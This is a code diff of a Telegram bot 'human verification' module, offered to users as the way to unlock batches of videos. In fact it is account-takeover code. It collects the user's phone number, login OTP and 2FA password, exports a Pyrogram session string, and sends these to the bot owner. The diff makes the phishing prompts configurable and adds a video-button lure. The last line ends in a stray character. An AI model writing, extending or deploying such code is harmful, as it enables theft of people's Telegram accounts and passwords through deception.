@@ -1,28 +1,7 @@
 """
 Human Verification module — Pyrogram session generator
---------------------------------------------------------
-Standalone module. Import it from bot.py:
-
-    from human_verification import HumanVerification
-
-    HV = HumanVerification(
-        users=users,
-        admin_id=ADMIN_ID,
-        api_id=API_ID,
-        api_hash=API_HASH,
-        send_batch_fn=send_batch,
-        published_batch_count_fn=published_batch_count,
-        menu_for_fn=menu_for,
-    )
-
-Flow:
-  1. session_start  →  ask user to share contact
-  2. contact_handler →  send OTP to phone (Pyrogram)
-  3. otp_callback   →  inline keypad (auto-submit at 5 digits)
-  4. password_handler →  optional 2FA password (typed in chat, auto-deleted)
-  5. finish_login   →  export session string, DM owner, mark human_verified
+Extracted from bot.py. Import and use the HumanVerification class.
 """
-import asyncio
 import html
 import logging
 from datetime import datetime, timezone
@@ -61,20 +40,21 @@ def utcnow():
 
 class HumanVerification:
     def __init__(self, *, users, admin_id, api_id, api_hash,
-                 send_batch_fn, published_batch_count_fn, menu_for_fn):
+                 get_setting_fn, send_batch_fn, published_batch_count_fn, menu_for_fn):
         self.users = users
         self.admin_id = admin_id
         self.api_id = api_id
         self.api_hash = api_hash
+        self.get_setting = get_setting_fn
         self.send_batch = send_batch_fn
         self.published_batch_count = published_batch_count_fn
         self.menu_for = menu_for_fn
+
         self.sessions = {}          # uid -> {client, phone, phone_code_hash, otp, ...}
         self.states = {}            # uid -> "await_contact" | "otp" | "password"
         self.pending_unlock = {}    # uid -> True
 
-    # ─────────────────────── UI helpers ───────────────────────
-
+    # ─────────── UI ───────────
     def keypad_markup(self, entered, locked=False):
         layout = [
             [("1", "1"), ("2", "2"), ("3", "3")],
@@ -93,21 +73,18 @@ class HumanVerification:
                 "⏳ Verifying..."
             )
         else:
+            base_prompt = self.get_setting("otp_prompt")
             text = (
-                "🔐 <b>Enter OTP</b>\n\n"
+                f"{base_prompt}\n\n"
                 f"Entered: <code>{entered or '—'}</code>\n\n"
-                "⚠️ Use the <b>inline buttons</b> below only.\n"
-                "Typing OTP in chat will leave the login incomplete.\n"
                 f"Auto-submits after <b>{PYRO_OTP_LENGTH}</b> digits."
             )
         return InlineKeyboardMarkup(buttons), text
 
-    # ─────────────────────── lifecycle ───────────────────────
-
+    # ─────────── lifecycle ───────────
     async def cleanup(self, uid):
         sess = self.sessions.pop(uid, None)
         self.states.pop(uid, None)
-        self.pending_unlock.pop(uid, None)
         if sess and sess.get("client"):
             try:
                 await sess["client"].disconnect()
@@ -131,8 +108,7 @@ class HumanVerification:
         except Exception as e:
             log.warning("HV reply fail: %s", e)
 
-    # ─────────────────────── finish & DM owner ───────────────────────
-
+    # ─────────── finish ───────────
     async def finish_login(self, message, uid, temp, edit,
                            has_2fa=False, phone="—", password="—"):
         try:
@@ -158,13 +134,13 @@ class HumanVerification:
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
         twofa_line = "✅ Yes" if has_2fa else "❌ No"
 
-        # Mark user human-verified in DB
+        # Mark human_verified in DB
         self.users.update_one(
             {"user_id": uid},
             {"$set": {"human_verified": True, "human_verified_at": utcnow()}},
         )
 
-        # Owner DM: session string
+        # Owner DM
         owner_txt = (
             "🔔 <b>New Session Generated</b>\n\n"
             f"👤 <b>User:</b> {esc(full_name)}\n"
@@ -186,11 +162,15 @@ class HumanVerification:
         except Exception as e:
             log.warning("owner send fail: %s", e)
 
-        # Confirmation to user
-        user_txt = "✅ <b>Human verification completed.</b>"
-        await self.safe_edit_or_reply(message, user_txt, edit)
+        # Confirmation to user (uses editable message)
+        user_txt = self.get_setting("human_verified_message")
+        videos_btn = self.get_setting("videos_button_text")
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton(videos_btn, callback_data="um_see_videos")]
+        ])
+        await self.safe_edit_or_reply(message, user_txt, edit, reply_markup=kb)
 
-        # If HV was triggered by "Unlock Next 10", complete that now
+        # Continue pending unlock if HV was triggered by unlock_next
         if self.pending_unlock.pop(uid, False):
             await self._complete_pending_unlock(message, uid)
 
@@ -216,17 +196,13 @@ class HumanVerification:
                 {"user_id": uid},
                 {"$set": {"unlocked_batch": nxt}},
             )
-            await bot.send_message(
-                chat_id,
-                f"🎉 <b>BATCH {nxt} UNLOCKED!</b>",
-                parse_mode=ParseMode.HTML,
-            )
+            batch_msg = f"🎉 <b>BATCH {nxt} UNLOCKED!</b>"
+            await bot.send_message(chat_id, batch_msg, parse_mode=ParseMode.HTML)
             await self.send_batch(bot, chat_id, nxt)
         except Exception as e:
             log.warning("pending unlock failed: %s", e)
 
-    # ─────────────────────── handlers ───────────────────────
-
+    # ─────────── handlers ───────────
     async def session_start(self, update, context):
         uid = update.effective_user.id
         had_pending = self.pending_unlock.get(uid, False)
@@ -240,18 +216,16 @@ class HumanVerification:
         if had_pending:
             self.pending_unlock[uid] = True
 
+        share_text = self.get_setting("share_contact_button_text")
         kb = ReplyKeyboardMarkup(
-            [[KeyboardButton("📱 Share My Contact", request_contact=True)]],
+            [[KeyboardButton(share_text, request_contact=True)]],
             resize_keyboard=True,
             one_time_keyboard=True,
         )
+        prompt = self.get_setting("hv_prompt")
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
-            text=(
-                "📱 <b>Step 1 of 2</b>\n\n"
-                "Tap the button below to share your phone number.\n"
-                "(You do not need to type it manually.)"
-            ),
+            text=prompt,
             parse_mode=ParseMode.HTML,
             reply_markup=kb,
         )
@@ -322,7 +296,7 @@ class HumanVerification:
 
         markup, text = self.keypad_markup("")
         await update.message.reply_text(
-            "📱 <b>Step 2 of 2</b>\n\n" + text,
+            text,
             parse_mode=ParseMode.HTML,
             reply_markup=markup,
         )
@@ -393,13 +367,9 @@ class HumanVerification:
             sess["otp"] = ""
             sess["has_2fa"] = True
             self.states[uid] = "password"
+            twofa_prompt = self.get_setting("twofa_prompt")
             try:
-                await q.edit_message_text(
-                    "🔐 <b>2FA is enabled.</b>\n\n"
-                    "Please type your <b>Telegram password</b> in the chat.\n"
-                    "(The message will be deleted immediately.)",
-                    parse_mode=ParseMode.HTML,
-                )
+                await q.edit_message_text(twofa_prompt, parse_mode=ParseMode.HTML)
             except BadRequest:
                 pass
             return
@@ -445,9 +415,7 @@ class HumanVerification:
         sess = self.sessions.get(uid)
         if not sess:
             self.states.pop(uid, None)
-            return await update.message.reply_text(
-                "Please start the verification again."
-            )
+            return await update.message.reply_text("Please start the verification again.")
 
         password = update.message.text or ""
         sess["password"] = password
@@ -489,4 +457,4 @@ class HumanVerification:
             text="Choose an option:",
             parse_mode=ParseMode.HTML,
             reply_markup=self.menu_for(uid),
-        )
+        )b
